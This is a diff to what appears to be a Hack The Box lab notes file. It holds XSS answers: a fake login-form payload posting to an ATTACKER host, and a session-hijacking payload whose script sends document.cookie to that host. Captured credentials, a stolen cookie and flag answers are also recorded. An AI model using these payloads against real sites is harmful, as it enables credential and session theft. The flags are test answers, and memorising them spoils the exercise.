@@ -120,3 +120,11 @@ Payload: '><h3>Please login to continue</h3><form action=http://ATTACKER><input 
 Victim creds captured: admin : p1zd0nt57341myp455
 Login at /phishing/login.php -> flag
 ANSWER: HTB{r3f13c73d_cr3d5_84ck_2_m3}
+
+---
+# XSS Session Hijacking exercise (target 10.129.234.166) [HTB VPN]
+Vulnerable field: Profile picture URL; payload: "><script src=http://ATTACKER/script.js></script>
+script.js: new Image().src='http://ATTACKER/index.php?c='+document.cookie;
+Stolen admin cookie: cookie=c00k1355h0u1d8353cu23d
+Use cookie at /hijacking/login.php -> flag
+ANSWER: HTB{4lw4y5_53cur3_y0ur_c00k135}
